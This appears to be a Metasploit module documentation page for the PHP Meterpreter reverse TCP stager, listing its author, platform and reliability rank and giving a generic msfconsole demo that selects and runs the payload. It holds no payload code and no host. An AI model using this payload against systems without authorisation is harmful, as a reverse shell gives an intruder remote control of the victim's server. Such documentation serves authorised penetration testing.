## PHP Meterpreter, PHP Reverse TCP Stager

Run a meterpreter server in PHP. Reverse PHP connect back 
stager with checks for disabled functions


## Module Name
payload/php/meterpreter/reverse_tcp

## Authors
* egypt





## Platforms
* php

## Reliability
[Normal](https://github.com/rapid7/metasploit-framework/wiki/Exploit-Ranking)

## Demo

```
msf > use payload/php/meterpreter/reverse_tcp
msf payload(reverse_tcp) > show targets
   ... a list of targets ...
msf payload(reverse_tcp) > set TARGET <target-id>
msf payload(reverse_tcp) > show options
   ... show and set options ...
msf payload(reverse_tcp) > run
```
    
    